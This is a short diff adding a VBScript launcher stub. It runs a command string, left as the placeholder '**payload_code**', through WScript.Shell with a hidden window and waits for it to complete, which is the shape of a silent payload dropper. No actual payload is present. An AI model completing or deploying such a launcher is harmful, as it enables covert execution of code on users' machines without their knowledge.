@@ -1,0 +1,3 @@
+Set objShell = WScript.CreateObject("WScript.Shell")
+strCommand = "**payload_code**"
+objShell.Run strCommand, 0, true
